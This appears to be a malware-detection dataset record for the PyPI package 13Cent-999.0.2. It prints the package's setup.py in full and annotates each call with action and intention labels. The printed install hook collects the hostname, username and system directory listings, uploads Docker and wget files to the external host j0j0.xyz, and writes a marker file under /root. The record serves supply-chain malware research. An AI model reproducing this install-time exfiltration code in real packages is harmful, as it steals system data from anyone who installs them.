{
  "metadata": {
    "package_name": "13Cent-999.0.2",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/13Cent-999.0.2.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/13Cent-999.0.2.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import requests\nimport socket\nimport getpass\nimport os\nfrom setuptools.command.install import install\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        try:\n            open('/root/j0j0.poc', 'a').close()\n        except:\n            pass\n\n        try:\n            ld0 = os.listdir('/run/')\n        except:\n            ld0 = 'ld0 is empty'\n            pass\n        try:\n            ld1 = os.listdir('/etc/')\n        except:\n            ld1 = 'ld1 is empty'\n            pass\n        try:\n            ld2 = os.listdir('/home/')\n        except:\n            ld2 = 'ld2 is empty'\n            pass\n        try:\n            ld3 = os.listdir('/mnt/')\n        except:\n            ld3 = 'ld3 is empty'\n            pass\n        try:\n            ld4 = os.listdir('/rasp/')\n        except:\n            ld4 = 'ld4 is empty'\n            pass\n\n        pload1 = {'run':ld0}\n        pload2 = {'etc':ld1}\n        pload3 = {'home':ld2}\n        pload4 = {'mnt':ld3}\n        pload5 = {'rasp':ld4}\n        headers = {'content-type': 'application/x-www-form-urlencoded'}\n        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld0/', data=pload1, verify=True, headers=headers)\n        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld1/', data=pload2, verify=True, headers=headers)\n        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld2/', data=pload3, verify=True, headers=headers)\n        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld3/', data=pload4, verify=True, headers=headers)\n        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld4/', data=pload5, verify=True, headers=headers)\n        \n        try:\n            with open('/.dockerenv','rb') as payload:\n                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload, verify=True, headers=headers)\n        except:\n            pass\n        try:\n            with open('/root/.wget-hsts','rb') as payload2:\n                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload2, verify=True, headers=headers)\n        except:\n            pass\n        try:\n            with open('/var/lib/docker/containers/container-id/config.v2.json','rb') as payload3:\n                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload3, verify=True, headers=headers)\n        except:\n            pass",
          "triple_sequences": [
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "getpass.getuser()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "open('/root/j0j0.poc', 'a').close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "/root/j0j0.poc",
              "object_description": "Marker file",
              "object_id": "marker_file",
              "intention_description": "Create marker file",
              "intention_id": "create_marker_file"
            },
            {
              "action_api": "os.listdir('/run/')",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "/run/",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List directory files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.listdir('/etc/')",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "/etc/",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List directory files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.listdir('/home/')",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "/home/",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List directory files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.listdir('/mnt/')",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "/mnt/",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List directory files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.listdir('/rasp/')",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "/rasp/",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List directory files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/lists/{hostname}/{username}/ld0/, data=pload1, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/lists/{hostname}/{username}/ld1/, data=pload2, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/lists/{hostname}/{username}/ld2/, data=pload3, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/lists/{hostname}/{username}/ld3/, data=pload4, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/lists/{hostname}/{username}/ld4/, data=pload5, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "open('/.dockerenv','rb')",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "/.dockerenv",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/{hostname}/{username}/files/, data=payload, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit file data server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "open('/root/.wget-hsts','rb')",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "/root/.wget-hsts",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/{hostname}/{username}/files/, data=payload2, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit file data server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "open('/var/lib/docker/containers/container-id/config.v2.json','rb')",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "/var/lib/docker/containers/container-id/config.v2.json",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://j0j0.xyz/{hostname}/{username}/files/, data=payload3, headers={'content-type': 'application/x-www-form-urlencoded'}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit file data server",
              "intention_id": "transmit_file_data_server"
            }
          ]
        }
      ]
    }
  ]
}